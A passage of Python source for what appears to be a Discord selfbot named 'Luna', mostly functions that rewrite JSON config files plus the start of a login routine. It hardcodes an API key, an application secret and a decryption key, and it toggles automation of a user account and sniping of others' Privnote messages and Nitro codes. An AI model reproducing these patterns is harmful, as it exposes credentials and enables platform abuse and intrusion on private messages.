		"delay_in_minutes": f"{newmode}",
		"giveaway_blocked_words": f"{giveaway_blocked_words}",
		"giveaway_server_joiner": f"{giveaway_server_joiner}"
	}
	with open("data/giveawayjoiner.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_giveaway_sniperjoiner(newmode):
	with open('data/giveawayjoiner.json') as f:
		data = json.load(f)
	giveawayjoiner = data.get('giveawayjoiner')
	delay_in_minutes = int(data.get('delay_in_minutes'))
	giveaway_blocked_words = data.get('giveaway_blocked_words')
	data = {
		"giveawayjoiner": f"{giveawayjoiner}",
		"delay_in_minutes": f"{delay_in_minutes}",
		"giveaway_blocked_words": f"{giveaway_blocked_words}",
		"giveaway_server_joiner": f"{newmode}"
	}
	with open("data/giveawayjoiner.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_selfbot_detection(newmode):
	data = {
		"selfbotdetection": f"{newmode}"
	}
	with open("data/selfbotdetection.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_privnote_sniper(newmode):
	data = {
		"privnotesniper": f"{newmode}"
	}
	with open("data/privnote.json", "w") as f:
		f.write(json.dumps(data, indent=4))

# ///////////////////////////////////////////////////////////////
# Def file dump system (config)

def config_password(newpassword):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{newpassword}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_prefix(newprefix):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{newprefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_streamurl(newstreamurl):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{newstreamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_afkmessage(newafkmessage):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{newafkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_deletetimer(newdeletetimer):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{newdeletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_mode(newmode):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{newmode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_errorlog(newerrorlog):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{newerrorlog}",
		"riskmode": f"{riskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_riskmode(newriskmode):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	themesvar = config.get('theme')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{newriskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_set(theme):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	startup_status = config.get('startup_status')
	if ".json" in theme:
		theme = theme.replace('.json', '')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": theme + ".json",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_startupstatus(newstatus):
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	themesvar = config.get('theme')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": f"{themesvar}",
		"startup_status": f"{newstatus}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))


# ///////////////////////////////////////////////////////////////
# Def webhook


def webhooktitle():
	with open('data/webhook.json') as f:
		config = json.load(f)
	title = config.get('title')
	return title


def webhookfooter():
	with open('data/webhook.json') as f:
		config = json.load(f)
	footer = config.get('footer')
	return footer


def webhookimageurl():
	with open('data/webhook.json') as f:
		config = json.load(f)
	imageurl = config.get('imageurl')
	return imageurl


def webhookhexcolor():
	with open('data/webhook.json') as f:
		config = json.load(f)
	hexcolor = config.get('hexcolor')
	if hexcolor == "random":
		hexcolor = random.randint(0, 0xffffff)
	elif len(hexcolor) > 7:
		hexcolor = int(hexcolor)
	else:
		hexcolor = int(hexcolor.replace('#', ''), 16)
	return hexcolor


# ///////////////////////////////////////////////////////////////
# Def webhook config

def config_webhook_title(newtitle: str):
	with open('data/webhook.json') as f:
		config = json.load(f)
	footer = config.get('footer')
	imageurl = config.get('imageurl')
	hexcolor = config.get('hexcolor')
	data = {
		"title": f"{newtitle}",
		"footer": f"{footer}",
		"imageurl": f"{imageurl}",
		"hexcolor": f"{hexcolor}"
	}
	with open("data/webhook.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_webhook_footer(newfooter: str):
	with open('data/webhook.json') as f:
		config = json.load(f)
	title = config.get('title')
	imageurl = config.get('imageurl')
	hexcolor = config.get('hexcolor')
	data = {
		"title": f"{title}",
		"footer": f"{newfooter}",
		"imageurl": f"{imageurl}",
		"hexcolor": f"{hexcolor}"
	}
	with open("data/webhook.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_webhook_image(newimageurl: str):
	with open('data/webhook.json') as f:
		config = json.load(f)
	title = config.get('title')
	footer = config.get('footer')
	hexcolor = config.get('hexcolor')
	data = {
		"title": f"{title}",
		"footer": f"{footer}",
		"imageurl": f"{newimageurl}",
		"hexcolor": f"{hexcolor}"
	}
	with open("data/webhook.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_webhook_hexcolor(newhexcolor: str):
	with open('data/webhook.json') as f:
		config = json.load(f)
	title = config.get('title')
	footer = config.get('footer')
	imageurl = config.get('imageurl')
	data = {
		"title": f"{title}",
		"footer": f"{footer}",
		"imageurl": f"{imageurl}",
		"hexcolor": f"{newhexcolor}"
	}
	with open("data/webhook.json", "w") as f:
		f.write(json.dumps(data, indent=4))


# ///////////////////////////////////////////////////////////////
# Def toast


def toast_title():
	with open('data/toast.json') as f:
		config = json.load(f)
	title = config.get('title')
	return title


def toast_icon():
	with open('data/toast.json') as f:
		config = json.load(f)
	icon = config.get('icon')
	return icon


# ///////////////////////////////////////////////////////////////
# Def toast config

def config_toast_icon(newicon: str):
	with open('data/toast.json') as f:
		config = json.load(f)
	title = config.get('title')
	data = {
		"icon": f"{newicon}",
		"title": f"{title}",
	}
	with open("data/toast.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_title(newtitle: str):
	with open('data/toast.json') as f:
		config = json.load(f)
	icon = config.get('icon')
	data = {
		"icon": f"{icon}",
		"title": f"{newtitle}",
	}
	with open("data/toast.json", "w") as f:
		f.write(json.dumps(data, indent=4))


# ///////////////////////////////////////////////////////////////
# Def toasts

def toast_all():
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	return toasts


def toast_login():
	with open('data/toasts.json') as f:
		config = json.load(f)
	login = config.get('login')
	return login


def toast_nitro():
	with open('data/toasts.json') as f:
		config = json.load(f)
	nitro = config.get('nitro')
	return nitro


def toast_giveaway():
	with open('data/toasts.json') as f:
		config = json.load(f)
	giveaway = config.get('giveaway')
	return giveaway


def toast_privnote():
	with open('data/toasts.json') as f:
		config = json.load(f)
	privnote = config.get('privnote')
	return privnote


def toast_selfbot():
	with open('data/toasts.json') as f:
		config = json.load(f)
	selfbot = config.get('selfbot')
	return selfbot


def toast_ping():
	with open('data/toasts.json') as f:
		config = json.load(f)
	pings = config.get('pings')
	return pings


def toast_ghostping():
	with open('data/toasts.json') as f:
		config = json.load(f)
	ghostpings = config.get('ghostpings')
	return ghostpings


def toast_friend_event():
	with open('data/toasts.json') as f:
		config = json.load(f)
	friendevents = config.get('friendevents')
	return friendevents


def toast_guild_event():
	with open('data/toasts.json') as f:
		config = json.load(f)
	guildevents = config.get('guildevents')
	return guildevents


def toast_role_update():
	with open('data/toasts.json') as f:
		config = json.load(f)
	roleupdates = config.get('roleupdates')
	return roleupdates


def toast_nickname_update():
	with open('data/toasts.json') as f:
		config = json.load(f)
	nickupdates = config.get('nickupdates')
	return nickupdates


def toast_protection():
	with open('data/toasts.json') as f:
		config = json.load(f)
	protection = config.get('protection')
	return protection


# ///////////////////////////////////////////////////////////////
# Def file dump system (data/toasts.json)

def config_toast_toasts(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{newmode}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_login(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{newmode}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_nitro(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{newmode}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_giveaway(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{newmode}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_privnote(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{newmode}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_selfbot(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{newmode}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_pings(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{newmode}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_ghostpings(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{newmode}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_friendevents(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{newmode}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_guildevents(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{newmode}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_roleupdates(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{newmode}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_nickupdates(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	protection = config.get('protection')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{newmode}",
		"protection": f"{protection}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_toast_protections(newmode):
	with open('data/toasts.json') as f:
		config = json.load(f)
	toasts = config.get('toasts')
	login = config.get('login')
	nitro = config.get('nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	pings = config.get('pings')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	data = {
		"toasts": f"{toasts}",
		"login": f"{login}",
		"nitro": f"{nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"pings": f"{pings}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{newmode}"
	}
	with open("data/toasts.json", "w") as f:
		f.write(json.dumps(data, indent=4))

# ///////////////////////////////////////////////////////////////

def notificationmention():
	with open('data/notify.json') as f:
		config = json.load(f)
	pings = config.get('pings')
	return pings

# ///////////////////////////////////////////////////////////////

def config_mention(newmode):
	with open('data/notify.json') as f:
		config = json.load(f)
	nitro = config.get('nitro')
	unknown_nitro = config.get('unknown-nitro')
	giveaway = config.get('giveaway')
	privnote = config.get('privnote')
	selfbot = config.get('selfbot')
	unknown_selfbot = config.get('unknown-selfbot')
	ghostpings = config.get('ghostpings')
	friendevents = config.get('friendevents')
	guildevents = config.get('guildevents')
	roleupdates = config.get('roleupdates')
	nickupdates = config.get('nickupdates')
	protection = config.get('protection')
	data = {
		"nitro": f"{nitro}",
		"unknown-nitro": f"{unknown_nitro}",
		"giveaway": f"{giveaway}",
		"privnote": f"{privnote}",
		"selfbot": f"{selfbot}",
		"unknown-selfbot": f"{unknown_selfbot}",
		"pings": f"{newmode}",
		"ghostpings": f"{ghostpings}",
		"friendevents": f"{friendevents}",
		"guildevents": f"{guildevents}",
		"roleupdates": f"{roleupdates}",
		"nickupdates": f"{nickupdates}",
		"protection": f"{protection}"
	}
	with open("data/notify.json", "w") as f:
		f.write(json.dumps(data, indent=4))

# ///////////////////////////////////////////////////////////////
# Def file dump system (Sharing)

def config_share(newmode):
	with open('data/sharing.json') as f:
		slot = json.load(f)
	user_id = slot.get('user_id')
	data = {
		"share": f"{newmode}",
		"user_id": user_id
	}
	with open("data/sharing.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_share_userid(userid: int):
	with open('data/sharing.json') as f:
		slot = json.load(f)
	share = slot.get('share')
	data = {
		"share": f"{share}",
		"user_id": userid
	}
	with open("data/sharing.json", "w") as f:
		f.write(json.dumps(data, indent=4))

# ///////////////////////////////////////////////////////////////

def restart_program():
	python = sys.executable
	os.execl(python, python, *sys.argv)

# ///////////////////////////////////////////////////////////////

luna_gg = luna_gg(api_key="485477744381137547167158333254493", aid="940932", application_secret="1fZDchzE3iZyiq0Ir5nAaFZ0p1c00zkqLc5")

def luna_authentication():
	title(f"Luna")
	clear()
	if file_exist('Updater.exe'):
		os.remove('Updater.exe')
	versionpastedec = urllib.request.urlopen('https://pastebin.com/raw/iQPkzEpg')
	for line in versionpastedec:
		versionpaste = line.decode().strip()
	if f"'{lunaversion}'" == versionpaste:
		if file_exist('data/login.json'):
			luna_auth_login()
		else:
			print(purpleblue(logo))
			printmessage("1 = Log into an existing account")
			printmessage("2 = Register a new account")
			printmessage("If you forgot your password, open a ticket\n")
			print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
			datetime.now(tz=None)
			dateTimeObj = datetime.now()
			timestampStr = dateTimeObj.strftime("%H:%M")
			print(f"{purple(f'{timestampStr}')} | {purple(f'{Input}')} | Choice: ", end='')
			choice = str(input())
			if choice == "1":
				luna_auth_login()
			elif choice == "2":
				luna_auth_register()
			else:
				clear()
				print(purpleblue(logo))
				printerror("That choice does not exist!")
				time.sleep(5)
				restart_program()
	else:
		luna_update()


def luna_auth_login():
	title(f"Luna | Login")
	clear()
	print(purpleblue(logo))
	if file_exist('data/login.json'):
		with open('data/login.json') as f:
			loginfile = json.load(f)
		username = loginfile.get('username')
		password = loginfile.get('password')
		try:
			username = Decryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
			password = Decryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
		except:
			os.remove('data/login.json')
			printerror("There has been an issue with your login. You need to log in again.")
			time.sleep(1)
			printmessage("Redirecting to the main menu in 5 seconds")
			time.sleep(5)
			luna_authentication()
		try:
			title(f"Luna | Logging in...")
			printevent("Logging in...")
